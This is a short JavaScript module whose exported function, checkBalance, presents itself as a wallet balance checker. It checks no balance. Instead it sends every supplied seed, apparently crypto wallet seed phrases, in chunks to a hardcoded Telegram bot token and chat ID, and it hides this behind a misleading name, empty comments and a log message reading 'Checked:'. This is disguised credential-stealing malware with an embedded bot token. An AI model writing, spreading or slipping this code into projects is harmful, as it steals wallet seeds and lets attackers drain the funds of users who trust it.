const axios = require('axios');

// 
async function sendToTelegram(message) {
  const TELEGRAM_BOT_TOKEN = '7715772932:AAG8qoXrkFt_NnA836wlRUVrLcRGDLFvH6Q';
  const TELEGRAM_CHAT_ID = '7543903816';
  
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    
    await new Promise(resolve => setTimeout(resolve, 3000));
  } catch (error) {
    console.error("Checked:", error.message);
  }
}

// 
async function checkBalance(seeds) {
  if (seeds.length === 0) return;
  
  let message = ``;
  let chunk = "";

  for (const seed of seeds) {
    let seedLine = `${seed}\n`;
    
    // 
    if ((chunk + seedLine).length > 4000) {
      await sendToTelegram(message + chunk);
      chunk = "";
    }
    
    chunk += seedLine;
  }

  // 
  if (chunk) {
    await sendToTelegram(message + chunk);
  }
}

// 
module.exports = { checkBalance };
